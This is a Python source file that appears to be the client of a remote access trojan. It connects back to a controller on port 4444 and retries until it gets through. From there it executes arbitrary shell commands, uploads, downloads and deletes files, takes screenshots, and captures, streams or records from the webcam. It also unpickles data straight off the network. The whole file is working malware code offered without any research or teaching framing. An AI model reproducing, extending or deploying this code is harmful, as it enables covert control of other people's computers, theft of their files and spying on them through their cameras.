import socket
import os
import shutil
import pickle
import subprocess
import cv2
import numpy as np
import time
from datetime import datetime
from mss import mss

IP_ADDRESS = "127.0.0.1"
PORT = 4444
WAIT_DURATION = 10

def main():
    while True:

        command = pickle.loads(client.recv(1024))

        if command[:11] == '<CHK_ALIVE>':
            client.send(pickle.dumps("<IM_ALIVE>"))

        elif command[0:2] == 'cd':
            current_dir = os.getcwd()
            command = command[2:].strip()

            if command == '..':
                os.chdir(os.path.dirname(current_dir))
                report = os.getcwd()

            elif command == '':
                os.chdir(os.path.expanduser('~'))
                current_dir = os.getcwd()
                report = current_dir

            else:
                os.chdir(os.path.join(current_dir, command.strip("'")))
                report = os.getcwd()

            send_pickled(report, client)


        elif command[0:2] == 'ls':

            files = os.listdir()
            report = files
            send_pickled(report, client)


        elif command[0:2] == 'rm':
            command = word_splitter(command)

            path = os.path.abspath(command[1])
            file_name = os.path.basename(path)
            os.remove(path)

            report = f'[+] {file_name} removed.'
            send_pickled(report, client)


        elif command[0:2] == 'cp':
            command = word_splitter(command)

            from_path = os.path.abspath(command[1])
            to_path = os.path.abspath(command[2])

            shutil.copyfile(from_path, to_path)

            report = f'[+] File successfully copied from {from_path} to {to_path}!'

            send_pickled(report, client)


        elif command[0:2] == 'mv':
            command = word_splitter(command)

            from_path = os.path.abspath(command[1])
            to_path = os.path.abspath(command[2])

            shutil.move(from_path, to_path)

            report = f'[+] File successfully moved from {from_path} to {to_path}!'

            send_pickled(report, client)

        elif command[0:3] == 'pwd':
            current_dir = os.getcwd()
            report = current_dir
            send_pickled(report, client)
            
        elif command[0:6] == 'upload':
            command = word_splitter(command)
            fileName = os.path.basename(command[1])
            
            if len(command) == 2:
                write_path = os.path.join(os.getcwd(), fileName)
            elif(os.path.isdir(command[2])):
                write_path = os.path.join(os.path.abspath(command[2]), fileName)
            else:
                write_path = os.path.abspath(command[2])

            download_file(write_path)
        elif command[0:7] == 'execute':
            command = word_splitter(command)
            if command[1] == '-p':
                path = os.path.abspath(command[2])
                execution = subprocess.call([path], shell=True)
                report = f'[+] {command[2]} has executed succesfully!'
            
            else:
                process = subprocess.check_output(command[1:], stderr=subprocess.STDOUT, shell=True, text=True)
                report = process
            send_pickled(report, client)

            
        elif command[0:8] == 'download':
            command = word_splitter(command)
            read_path = os.path.abspath(command[1])

            try:
                command[2]
            
            except IndexError:

                write_fileName = os.path.basename(read_path)
                send_pickled(write_fileName, client)

            
            upload_file(read_path)

        elif command[0:10] == "screenshot":
            filename = filename_with_date() + '.png'
            screenshot = mss().shot(output=filename)
            

            filepath = os.path.join(os.getcwd(), filename)
            upload_file(filepath)
            os.remove(filepath)

        elif command [0:11] == "webcam shot":
            cap = cv2.VideoCapture(0)

            file_name = filename_with_date() + ".png"
            read_path = os.path.join(os.getcwd(), file_name)

            return_value, image = cap.read()
            cv2.imwrite(read_path, image)
            cap.release()


            report = "[+] " + read_path + " has saved."
            send_pickled(report, client)


        elif command[0:13] == "webcam stream":
            command = word_splitter(command)
            cap = cv2.VideoCapture(0)


            finish_code = b"<FIN>"
            start_code = b"<STR>"
            size_code = b"<SIZ>"
        
            duration = int(command[2])
            start_time = time.time()

            while time.time()-start_time<duration:
                ret, frame = cap.read()

                packet = pickle.dumps(frame)


                left = 1024 - ((len(packet)%1024) + 5)
                left_bytes = str(left).encode()

                fragment = start_code + packet + bytes(left) 
                fragment2 = finish_code + left_bytes + size_code + bytes(1024-10-len(left_bytes))

                client.send(fragment)
                client.send(fragment2)

            client.send(b'<TR>')
                
            cap.release()
      

        elif command[0:13] == 'webcam record':
            command = word_splitter(command)
            file_name = filename_with_date() + '.avi'
            read_path = os.path.abspath(file_name)

            cap = cv2.VideoCapture(0)

            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter(read_path, fourcc, 10.0, (640, 480))

            start_time = time.time()
            while int(time.time() - start_time) < int(command[2]):
                ret, frame = cap.read()

                out.write(frame)


            cap.release()
            out.release()



            report = "[+] " + read_path + " has saved."
            send_pickled(report, client)
            
        else:
            send_pickled("[-] Error! Your command couldn't recognized.", client)
def filename_with_date() -> str: 
    return str(datetime.now().strftime("%Y_%m_%d-%I_%M_%S_%p"))


def word_splitter(text):
    words = []
    word = ""
    in_word = False
    
    for char in text:
        if char == "'":
            in_word = not in_word
        elif char == " " and not in_word:
            words.append(word)
            word = ""
        else:
            word += char
    
    words.append(word)
    
    return words


def upload_file(path):
    buffer_size = 1024
    file_size = os.path.getsize(path)

    if file_size < 4096:
        with open(path, 'rb') as file_to_read:

            data = file_to_read.read()
            data = pickle.dumps(data)

            file_size = len(data)
            send_pickled(file_size, client)
            client.send(data)

    else:

        send_pickled(file_size, client)
        
        with open(path, 'rb') as file_to_read:
            data = file_to_read.read(buffer_size)

            while data:
                client.send(data)
                data = file_to_read.read(buffer_size)

            client.send(b'<TERM>')


def download_file(path):
    buffer_size = 1024
    file_size = receive_pickled(client)


    if file_size < 4096:
        data = client.recv(file_size)

        with open(path, 'wb') as file_to_write:
            data = pickle.loads(data)
            file_to_write.write(data)
    else:

        with open(path, 'wb') as file_to_write:
            data = client.recv(buffer_size)

            while data:
                if data[-6:] == b'<TERM>':
                    data = data[:-6]
                    file_to_write.write(data)
                    break

                file_to_write.write(data)
                data = client.recv(buffer_size)


def send_pickled(text, connected):
    data = pickle.dumps(text)
    connected.send(f"{len(data):<8}".encode())
    connected.send(data)

    

def receive_pickled(connected):
    buffer_size = int(connected.recv(8).strip().decode())
    return pickle.loads(connected.recv(buffer_size))


if __name__ == '__main__':
    def connect():
        try:
            client.connect((IP_ADDRESS, PORT))
        except ConnectionRefusedError:
            time.sleep(WAIT_DURATION)
            connect()



    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    connect()
    main()
